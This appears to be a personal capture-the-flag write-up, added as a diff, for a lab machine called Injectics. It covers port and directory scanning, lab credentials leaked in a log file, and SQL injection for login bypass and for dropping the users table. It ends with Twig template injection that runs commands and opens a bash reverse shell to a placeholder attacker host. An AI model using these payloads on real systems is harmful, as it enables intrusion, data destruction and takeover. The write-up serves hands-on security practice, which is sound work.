@@ -1,0 +1,123 @@
+Injectis!!
+
+nmap -sT -sV -T4 -p- -A --min-rate=9632 10.10.84.187  - 22 and 80
+
+http://10.10.84.187/ - crawling - found login.php and adminLogin007.php
+
+gobuster dir --url http://10.10.84.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium-list.txt
+flags                (Status: 301) [Size: 312] [--> http://10.10.84.187/flags/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.84.187/css/]
+/js                   (Status: 301) [Size: 309] [--> http://10.10.84.187/js/]
+/vendor               (Status: 301) [Size: 313] [--> http://10.10.84.187/vendor/]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.84.187/phpmyadmin/]
+/server-status        (Status: 403) [Size: 277]
+
+dirsearch -u http://10.10.84.187
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /root/reports/http_10.10.84.187/_25-05-05_16-58-29.txt
+
+Target: http://10.10.84.187/
+
+[16:58:29] Starting: 
+[16:58:29] 301 -  309B  - /js  ->  http://10.10.84.187/js/
+[16:58:31] 403 -  277B  - /.ht_wsr.txt
+[16:58:31] 403 -  277B  - /.htaccess.orig
+[16:58:31] 403 -  277B  - /.htaccess_extra
+[16:58:31] 403 -  277B  - /.htaccess_sc
+[16:58:31] 403 -  277B  - /.htaccess.bak1
+[16:58:31] 403 -  277B  - /.htaccess.save
+[16:58:31] 403 -  277B  - /.htaccessOLD
+[16:58:31] 403 -  277B  - /.html
+[16:58:31] 403 -  277B  - /.htaccessOLD2
+[16:58:31] 403 -  277B  - /.htaccessBAK
+[16:58:31] 403 -  277B  - /.htaccess.sample
+[16:58:31] 403 -  277B  - /.htm
+[16:58:31] 403 -  277B  - /.httr-oauth
+[16:58:31] 403 -  277B  - /.htpasswds
+[16:58:31] 403 -  277B  - /.htpasswd_test
+[16:58:31] 403 -  277B  - /.htaccess_orig
+[16:58:32] 403 -  277B  - /.php
+[16:58:48] 200 -    9KB - /composer.lock
+[16:58:48] 200 -   48B  - /composer.json
+[16:58:50] 301 -  310B  - /css  ->  http://10.10.84.187/css/
+[16:58:50] 302 -    0B  - /dashboard.php  ->  dashboard.php
+[16:58:54] 301 -  312B  - /flags  ->  http://10.10.84.187/flags/
+[16:58:58] 301 -  317B  - /javascript  ->  http://10.10.84.187/javascript/
+[16:58:58] 403 -  277B  - /js/
+[16:59:00] 200 -    1KB - /login.php
+[16:59:01] 302 -    0B  - /logout.php  ->  index.php
+[16:59:01] 200 -    1KB - /mail.log
+[16:59:07] 301 -  317B  - /phpmyadmin  ->  http://10.10.84.187/phpmyadmin/
+[16:59:08] 200 -    3KB - /phpmyadmin/doc/html/index.html
+[16:59:08] 200 -    3KB - /phpmyadmin/index.php
+[16:59:08] 200 -    3KB - /phpmyadmin/
+[16:59:12] 403 -  277B  - /server-status/
+[16:59:12] 403 -  277B  - /server-status
+[16:59:21] 403 -  277B  - /vendor/
+[16:59:21] 200 -    0B  - /vendor/composer/autoload_files.php
+[16:59:21] 200 -    0B  - /vendor/composer/autoload_real.php
+[16:59:21] 200 -    0B  - /vendor/composer/autoload_namespaces.php
+[16:59:21] 200 -    0B  - /vendor/composer/autoload_psr4.php
+[16:59:21] 200 -    0B  - /vendor/composer/autoload_classmap.php
+[16:59:21] 200 -    0B  - /vendor/autoload.php
+[16:59:21] 200 -   12KB - /vendor/composer/installed.json
+[16:59:21] 200 -    0B  - /vendor/composer/autoload_static.php
+[16:59:21] 200 -    0B  - /vendor/composer/ClassLoader.php
+[16:59:21] 200 -    1KB - /vendor/composer/LICENSE
+
+Task Completed
+
+
+Source code - <!-- Mails are stored in mail.log file-->
+
+/composer.json - twig/twig 2.14.0 - Possible SSTI
+/mail.log - `users` table
+| Email                     | Password 	              |
+|---------------------------|-------------------------|
+| superadmin@injectics.thm  | superSecurePasswd101    |
+| dev@injectics.thm         | devPasswd123            |
+
+
+http://10.10.84.187/phpmyadmin/doc/html/index.html - 4.9.5
+
+After trying to connect with credentials found in mail.log - we failed
+We need to bypass auth and drop the `users` table in order to authenticate
+
+intercept a login request in burp proxy and move the request to the intruder
+Let's launch an Sniper Attack!!!
+We use a payload from https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt and at the payload processing tab we add URL-encode:all-characters
+Launch the attack and wait: we found the payload %27%20%4f%52%20%27%78%27%3d%27%78%27%20%23%3b and decode it : ' OR 'x'='x' #;
+F5 in browser and we are logged as dev!!!!!
+
+We saw that we can edit some infos - let's try to do some SQLi!!!
+Intercept a POST request to update a row and manipulate it:
+POST: /edit-leaderboards.php HTTP 1.1
+..
+..
+..
+Body: rank=1&country=&gold=23&silver=21&bronze=12345 -> rank=1&country=&gold=23; drop table users -- -&silver=21&bronze=12345
+
+F5 in browser and we encounter a error message!! F5 again and logout from dev user!!!
+Now, on the admin login page, use the credentials found in mail.log to log is as admin!!!
+We have the first FLAG!!!
+
+
+Now, on the profile page, we can update our details - it't time for the SSTI!!!!
+in the first name, we change the value to `test` - and we see a message Wlcome, test!
+put {{7*7}}, and the answer is Welcome, 49!
+After looking online for some injections valid for twig - we found {{['id',""]|sort('passthru')}} - Answer is Welcome uid=33(www-data) gid=33...
+We put the command to open a remote shell, but first we need to open a listener on the attacker machine:
+nc -nvlp 4444
+{{ ["bash -c 'exec bash -i >& /dev/tcp/attacker_ip/4444 0>&1'", ""] | sort('passthru') }}
+Press Submit and F5!!!
+We open a connection: ls, cd flags, ls, cat file.txt
+We have the other flag!!!
+
+
+
+
